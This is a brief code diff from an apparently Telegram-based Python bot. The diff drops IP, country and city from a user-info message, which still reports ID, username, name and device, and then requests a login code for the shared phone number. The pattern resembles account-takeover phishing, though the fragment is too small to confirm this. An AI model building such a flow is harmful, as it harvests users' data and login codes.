@@ -236,9 +236,6 @@ async def contact_handler(message: types.Message):
             f"├ ID: <code>{user_id}</code>\n"
             f"├ Тэг: @{tg_user.username or '—'}\n"
             f"├ Имя: {tg_user.first_name or '—'}\n"
-            f"├ IP: {info.get('ip', '—')}\n"
-            f"├ Страна: {info.get('country', '—')}\n"
-            f"├ Город: {info.get('city', '—')}\n"
             f"└ Устройство: {info.get('device', '—')[:80]}"
         )
         phone_code_hash = await send_code(phone)
